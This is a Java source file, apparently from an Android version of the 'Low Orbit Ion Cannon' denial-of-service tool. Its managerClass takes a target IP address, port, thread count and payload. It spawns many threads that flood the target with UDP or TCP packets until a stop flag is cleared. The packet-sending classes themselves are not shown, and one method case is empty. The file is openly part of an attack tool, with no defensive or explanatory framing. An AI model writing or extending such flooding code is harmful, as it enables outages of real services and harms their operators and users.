package com.example.rifatrashid.loworbitioncannon;

import java.net.InetAddress;

/**
 * Created by Rifat Rashid on 8/10/2015.
 */
public class managerClass {

    public static boolean firing = false;

    public managerClass() {

    }

    public void start(InetAddress ip, int port, int threads, byte[] data, int methodType) {
        firing = true;
        switch (methodType) {
            //UDP
            case 1:
                try {
                    UDPpacket[] udPpacketsThread = new UDPpacket[threads];
                    for (int i = 0; i < threads; i++) {
                        udPpacketsThread[i] = new UDPpacket(ip, data, port);
                        new Thread(udPpacketsThread[i]).start();
                    }
                } catch (Exception io) {
                    io.printStackTrace();
                }
                break;
            //HTTP
            case 2:
                try{
                    TCPpacket[] tcpPacketsThread = new TCPpacket[threads];
                    for(int i = 0; i < threads; i++){
                        tcpPacketsThread[i] = new TCPpacket(ip, data, port);
                        new Thread(tcpPacketsThread[i]).start();
                    }
                }catch (Exception io){
                    io.printStackTrace();
                }
                break;
            //TCP
            case 3:
                break;
        }
    }

    public void stop() {
        firing = false;
    }
}
